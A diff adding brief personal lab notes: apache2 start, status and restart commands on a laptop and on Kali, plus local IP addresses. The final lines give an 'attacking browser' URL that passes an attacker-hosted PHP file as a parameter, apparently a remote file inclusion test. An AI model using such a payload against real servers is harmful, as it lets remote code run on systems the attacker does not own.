@@ -1,0 +1,21 @@
+apache2 on my laptop:
+- sudo /etc/init.d/apache2 start
+- sudo /etc/init.d/apache2 status
+- sudo /etc/init.d/apache2 restart
+
+start apache2 in default root folder:
+- cd /var/www/html
+
+apache2 on kali:
+- sudo systemctl start apache2
+- sudo systemctl status apache2
+- sudo systemctl restart apache2
+
+ip address:
+- ip addr
+- http://172.27.53.27/test.php
+- http://192.168.198.128/website.html
+
+in attcking browser:
+http://(kali_ip)/website.html
+http://(kali_ip)/php.php?user=http://(attack_ip)/test.php
